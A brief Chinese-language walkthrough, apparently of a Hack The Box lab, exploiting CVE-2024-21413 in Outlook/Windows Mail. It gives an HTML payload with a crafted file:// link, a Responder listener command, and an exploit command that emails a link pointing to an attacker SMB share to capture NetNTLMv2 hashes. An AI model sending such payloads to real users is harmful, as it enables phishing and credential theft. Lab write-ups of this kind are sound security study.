# windows mail

CVE-2024-21413

## 介绍

Outlook（以及Windows Mail）针对通过电子邮件传入的不同链接协议采取不同的安全措施。其中一种比较严格的是file://协议本身。研究人员发现，如果URL以“![任意内容]”结尾，则该安全措施会失效。这就意味着当攻击者发送此类链接，当用户点击，该链接会尝试向攻击者的SMB服务器进行身份验证，从而使攻击者能捕获NetNTLMv2哈希值，就能暴力破解密码。

```
<html>
    <body>
        <img src="{base64_image_string}" alt="Image"><br />
        <h1><a href="file:///{link_url}!poc">CVE-2024-21413 PoC.</a></h1>
    </body>
    </html>
```

主要在预览窗口打开该链接，windows mail就会尝试{link_url}通过SMB加载。

## 文件结构



## 利用

### 1）监听服务

sudo responder -I tun0 -v

### 2）漏洞利用

python CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender 0xdf@mailing.htb --recipient maya@mailing.htb --url "\\10.10.14.6\share\sploit" --subject "Check this out ASAP!"
